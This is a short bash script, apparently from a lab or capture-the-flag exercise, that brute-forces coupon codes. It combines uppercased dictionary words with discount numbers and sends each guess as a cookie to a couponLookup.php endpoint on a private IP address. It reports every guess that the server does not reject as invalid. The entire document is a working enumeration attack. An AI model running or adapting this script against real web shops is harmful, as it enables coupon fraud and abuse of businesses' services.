#!/bin/bash
#for d in {1-1000.txt}; do
tac 1-1000.txt | while read d; do
	for z in {5,10,15,20,25,30,35,40,45,50,55}; do
		u=$(echo "${d^^} $z" | sed 's/ //g')
		curl -s -b "couponName=$u" 'http://172.17.1.48:8080/couponLookup.php' | grep -q 'Invalid' || echo "Found: $u"
		echo $u
	done
done
